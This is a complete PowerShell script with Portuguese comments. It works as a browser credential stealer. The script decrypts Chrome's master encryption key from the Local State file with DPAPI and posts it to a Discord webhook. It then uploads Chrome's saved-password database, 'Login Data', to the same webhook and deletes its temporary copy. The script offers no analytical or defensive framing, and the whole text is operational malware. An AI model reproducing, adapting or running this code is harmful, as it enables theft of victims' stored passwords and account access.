# 1. Carrega a biblioteca de um jeito que não falha
$as = [System.AppDomain]::CurrentDomain.GetAssemblies()
if (!($as | Where-Object { $_.FullName -like "*Cryptography*" })) {
    Add-Type -AssemblyName System.Security.Cryptography
}

$u = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2m5YtSYIM3PU7f2_WLzAOIu6kDPwd45adNZdkGd8jMoutFQP1Ol-P9"

function Get-Key {
    try {
        $lp = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        if (!(Test-Path $lp)) { return "Chrome não encontrado" }
        
        $j = Get-Content $lp -Raw | ConvertFrom-Json
        $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)[5..255]
        
        # Descriptografa a Chave Mestre
        $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        $k = [Convert]::ToBase64String($m)
        
        # Manda a chave IMEDIATAMENTE antes de qualquer outra coisa
        curl.exe -X POST -F "content=CHAVE_MESTRE: $k" $u
        return $k
    } catch {
        curl.exe -X POST -F "content=ERRO NA CHAVE: $($_.Exception.Message)" $u
        return $null
    }
}

function Get-DB {
    $db = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    $t = "$env:TEMP\L"
    if (Test-Path $db) {
        Copy-Item $db $t -Force
        curl.exe -F "file=@$t" $u
        Remove-Item $t -Force
    }
}

# Executa as duas partes
$chave = Get-Key
Get-DB
